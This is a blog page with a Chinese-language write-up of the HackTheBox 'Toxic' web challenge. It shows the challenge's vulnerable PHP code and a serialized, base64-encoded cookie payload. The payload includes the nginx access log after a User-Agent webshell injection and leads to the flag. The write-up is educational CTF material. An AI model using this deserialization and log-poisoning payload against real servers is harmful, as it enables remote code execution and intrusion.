@@ -1,0 +1,72 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="懒"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>HackTheBox Toxic WriteUP | 忘返</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">且随我提灯照胆看江山。</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/links/">友链</a></li><li><span class="dot">●</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">HackTheBox Toxic WriteUP</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2023/08/23/HackTheBox-Toxic-WriteUP/">2023-08-23</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
+<p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p>
+</blockquote>
+<p><img src="/image.png" alt="Toxic"></p>
+<p><img src="/image-1.png" alt="Web"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>源代码很简单，只有两个PHP文件</p>
+<pre><code class="php">//index.php
+
+&lt;?php
+spl_autoload_register(function ($name)&#123;
+    if (preg_match(&#39;/Model$/&#39;, $name))
+    &#123;
+        $name = &quot;models/$&#123;name&#125;&quot;;
+    &#125;
+    include_once &quot;$&#123;name&#125;.php&quot;;
+&#125;);
+
+if (empty($_COOKIE[&#39;PHPSESSID&#39;]))
+&#123;
+    $page = new PageModel;
+    $page-&gt;file = &#39;/www/index.html&#39;;
+
+    setcookie(
+        &#39;PHPSESSID&#39;, 
+        base64_encode(serialize($page)), 
+        time()+60*60*24, 
+        &#39;/&#39;
+    );
+&#125; 
+
+$cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);
+unserialize($cookie);
+</code></pre>
+<pre><code class="php">//PageModel.php
+&lt;?php
+class PageModel
+&#123;
+    public $file;
+
+    public function __destruct() 
+    &#123;
+        include($this-&gt;file);
+    &#125;
+&#125;
+</code></pre>
+<p>很显然，是一个PHP反序列化+文件包含的漏洞利用。</p>
+<p>这里就需要找到一个可包含的日志文件，我们可以在<code>nginx.conf</code>中找到AccessLog文件的位置。</p>
+<p><img src="/image-2.png" alt="AccessLog"></p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用<code>User-Agent</code>写入WebShell：</p>
+<p><img src="/image-3.png" alt="UA"></p>
+<p>构造包含AccessLog的序列化数据：</p>
+<pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;
+//base64encode
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
+</code></pre>
+<p>利用WebShell获得文件名和Flag</p>
+<p><img src="/image-4.png" alt="FileName"></p>
+<p><img src="/image-5.png" alt="Flag"></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12507">php反序列化完整总结</a></li>
+</ul>
+</blockquote>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">忘返</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2023/08/23/HackTheBox-Toxic-WriteUP/">https://7mitu.github.io/2023/08/23/HackTheBox-Toxic-WriteUP/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://7mitu.github.io">忘返的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/HackTheBox/">HackTheBox</a><a href="/tags/Web/">Web</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/">HackTheBox WeatherAPP WriteUP &gt;</a></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">忘返</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
